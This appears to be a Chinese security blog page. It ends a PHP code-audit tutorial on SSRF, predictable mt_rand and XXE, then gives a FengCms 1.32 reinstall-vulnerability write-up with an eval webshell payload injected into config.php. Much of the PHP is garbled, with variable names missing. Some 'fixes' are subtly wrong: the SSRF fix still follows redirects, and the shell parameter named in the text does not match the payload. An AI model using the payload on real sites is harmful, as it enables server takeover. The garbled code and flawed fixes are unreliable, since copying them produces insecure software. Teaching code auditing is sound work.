<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt(ch, CURLOPT_URL, _GET[<span class="string">'url'</span>]);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未限制URL的协议，恶意使用其他协议可导致源码泄露、内网泄露等漏洞；如果使用了CDN，请求http会泄露源站IP<br>修复建议：<br>限制协议为HTTP、HTTPS；禁止30x跳转<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">url = _GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos(url, <span class="string">'http://'</span>) === <span class="keyword">false</span> &amp;&amp; strpos(url, <span class="string">'https://'</span>) === <span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'请求链接不合法'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt(ch, CURLOPT_URL, url);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<h3 id="7-9伪随机数漏洞"><a href="#7-9伪随机数漏洞" class="headerlink" title="7.9伪随机数漏洞"></a>7.9伪随机数漏洞</h3><h4 id="0x01漏洞背景-25"><a href="#0x01漏洞背景-25" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>mt_rand()并不是一个真·随机数生成函数,实际上绝大多数编程语言中的随机数函数生成的都都是伪随机数。<br>伪随机是由可确定的函数（常用线性同余），通过一个种子（常用时钟），产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p>
<h4 id="0x02漏洞代码及分析-19"><a href="#0x02漏洞代码及分析-19" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">(length = <span class="number">12</span>, special_chars = true)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($special_chars) &#123;</span><br><span class="line"></span><br><span class="line">        chars. = <span class="string">'!@#%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password. = substr(chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = wp_generate_password(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] This is a key for public:"</span>.$key.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$private = wp_generate_password(<span class="number">10</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] Create a private key which you don't know:"</span>.$private.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>如果没有mt_srand()给随机数发生器播种，mt_rand会使用一个随机生成的固定种子，如果知道$key的情况下，可以预测出$private。<br>修复建议：<br>mt_rand之前进行随机播种。<br>mt_srand((double)microtime()*1000000);<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">(length = <span class="number">12</span>, special_chars = true)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    mt_srand((double) microtime() * <span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($special_chars) &#123;</span><br><span class="line"></span><br><span class="line">        chars. = <span class="string">'!@#%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password. = substr(chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-10-XXE漏洞"><a href="#7-10-XXE漏洞" class="headerlink" title="7.10 XXE漏洞"></a>7.10 XXE漏洞</h3><h4 id="0x01漏洞背景-26"><a href="#0x01漏洞背景-26" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.在XML1.0标准<br>里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题.</p>
<h4 id="0x02漏洞代码及分析-20"><a href="#0x02漏洞代码及分析-20" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$xml = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">data = simplexml_load_string(xml);</span><br><span class="line"></span><br><span class="line">print_r($data);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>simplexml_load_string函数读取XML会引起XXE漏洞，导致任意文件读取、命令执行漏洞<br>修复建议：<br>使用XMLReader或DOM方式解析XML<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$xml = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">data = XMLReader: :xml(xml, <span class="string">'UTF-8'</span>, LIBXML_NONET);</span><br><span class="line"></span><br><span class="line">print_r($data);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-FengCms1.32 重装漏洞"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/19/FengCms1.32 重装漏洞/">FengCms1.32 重装漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/19/FengCms1.32 重装漏洞/" class="article-date">
	  <time datetime="2017-10-19T15:53:56.000Z" itemprop="datePublished">2017-10-19</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="FengCms1-32-重装漏洞"><a href="#FengCms1-32-重装漏洞" class="headerlink" title="FengCms1.32 重装漏洞"></a>FengCms1.32 重装漏洞</h2><p>FengCms基于PHP+MYSQL开发。是一款    开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。</p>
<p><strong>漏洞简介及危害</strong></p>
<p>本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。</p>
<p><strong>影响版本</strong></p>
<p>FengCms1.32</p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h4 id="步骤1：了解漏洞原理"><a href="#步骤1：了解漏洞原理" class="headerlink" title="步骤1：了解漏洞原理"></a>步骤1：了解漏洞原理</h4><p>本次漏洞的代码漏洞入口在<code>install/index.php</code>中，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">"TPL_INCLUDE"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义当前路径</span></span><br><span class="line">define(<span class="string">'ABS_PATH'</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">define(<span class="string">'ROOT_PATH'</span>,dirname(ABS_PATH));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(![<span class="string">'step'</span>])[<span class="string">'step'</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">=ROOT_PATH.<span class="string">'/config.php'</span>;</span><br><span class="line">=ABS_PATH.<span class="string">'/install.sql'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'[removed]alert("系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！");[removed]'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;meta http-equiv="refresh" content="0;url=/"&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>([<span class="string">'step'</span>])&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>: <span class="comment">//安装许可协议</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step1.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>: <span class="comment">//检查安装环境是否满足要求</span></span><br><span class="line"></span><br><span class="line">          = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'gd'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagepng'</span>))  .= <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagejpeg'</span>))  .= <span class="string">' jpg'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagegif'</span>))  .= <span class="string">' gif'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'json_decode'</span>) &amp;&amp; function_exists(<span class="string">'json_encode'</span>))  = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//新加fsockopen 函数判断,此函数影响安装后会员注册及登录操作。</span></span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'fsockopen'</span>)) &#123;</span><br><span class="line">             = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = preg_match(<span class="string">"/^[0-9.]&#123;7,15&#125;$/"</span>, @gethostbyname(<span class="string">'www.baidu.cn'</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//是否满足FengCms安装需求</span></span><br><span class="line"></span><br><span class="line">         = (phpversion() &gt;= <span class="string">'5.2.0'</span> &amp;&amp; extension_loaded(<span class="string">'mysql'</span>) &amp;&amp;  &amp;&amp;  &amp;&amp; ) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置文件是否存在和可写</span></span><br><span class="line"></span><br><span class="line">         = (is_readable() &amp;&amp; is_writable()) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上传目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模块导出目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload/module"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前台缓存目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/app/cache"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step2.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>: <span class="comment">//填写数据库信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step3.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>: <span class="comment">//正在安装</span></span><br><span class="line"></span><br><span class="line">        =@mysql_connect([<span class="string">'host'</span>],[<span class="string">'user'</span>],[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("链接主机失败，请检查主机地址、用户名和密码是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(intval(mysql_get_server_info())&lt;<span class="number">5</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("您的MYSQL版本为'</span>. mysql_get_server_info().<span class="string">'，版本太低，不能安装FengCms!");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!mysql_query(<span class="string">"CREATE DATABASE "</span>. [<span class="string">'dbname'</span>] .<span class="string">" default character set utf8;"</span>,))</span><br><span class="line"></span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'[removed]alert("数据库不存在，创建不成功");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'[removed]alert("链接数据库失败，请检查数据库是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>: <span class="comment">//安装完成</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step5.php"</span>;</span><br><span class="line">         = fopen(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>,<span class="string">'w'</span>);</span><br><span class="line">        fclose ();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>上述代码代码首先判断<code>upload/INSTALL</code>文件是否存在，若存在，就弹出JavaScript代码，提示我们需要删除目录下的INSTALL文件，如图：</p>
<p>但在这里我们直接点击确定即可，可以无视它的提示，即是不删除INSTALL文件，也可以进行安装操作。</p>
<p>我们再来看看<code>Install/install.php</code>文件，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// = fopen(, "w");   //以写入的方式打开config.php这个文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'install'</span>])&#123;  <span class="comment">//获取用户提交的数据。  </span></span><br><span class="line">=[<span class="string">'host'</span>];  </span><br><span class="line">=[<span class="string">'user'</span>];  </span><br><span class="line">=[<span class="string">'password'</span>];  </span><br><span class="line">=[<span class="string">'dbname'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!=@mysql_connect(,,))&#123;  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"连接数据库失败！请返回上一页检查连接参数 返回修改"</span>;  </span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  mysql_query(<span class="string">"set names gb2312"</span>);  <span class="comment">//设置数据库的编码，注意要与前面一致。  </span></span><br><span class="line">   <span class="keyword">if</span>(!mysql_select_db(,))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。  </span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(!mysql_query())&#123;  </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"创建数据库失败，请确认是否有足够的权限！返回修改"</span>;  </span><br><span class="line">           <span class="keyword">exit</span>();  </span><br><span class="line">          &#125;  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">     = fopen(, <span class="string">"w"</span>);   <span class="comment">//以写入的方式打开config.php这个文件。  </span></span><br><span class="line">    fwrite(,);  <span class="comment">//将配置信息写入config.php文件。  </span></span><br><span class="line">    fclose();  </span><br><span class="line">    <span class="keyword">include_once</span>(ABS_PATH.<span class="string">"config.php"</span>);   <span class="comment">//导入配置信息.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。  </span></span><br><span class="line">   <span class="comment">//新建一个表test1  </span></span><br><span class="line">   [] = <span class="string">"CREATE TABLE `test1` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">    <span class="comment">//新建一个表test2  </span></span><br><span class="line">    [] = <span class="string">"CREATE TABLE `test2` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">     <span class="comment">//为test1表默认初始化一些数据。  </span></span><br><span class="line">     []=<span class="string">"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')"</span>;  </span><br><span class="line">     <span class="keyword">foreach</span>( <span class="keyword">as</span> )&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!mysql_query())&#123;      <span class="comment">//依次执行以上的sql语句，就是创建表和初始化数据。  </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"创建表失败或者初始化数据失败"</span>;  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     mysql_close();  </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"安装成功"</span>;<span class="comment">//可以做一个跳转到首页。  </span></span><br><span class="line">     <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件：</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
<p>我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
<p>这样我们就可以通过参数<code>a</code> ，去执行任意的代码。</p>
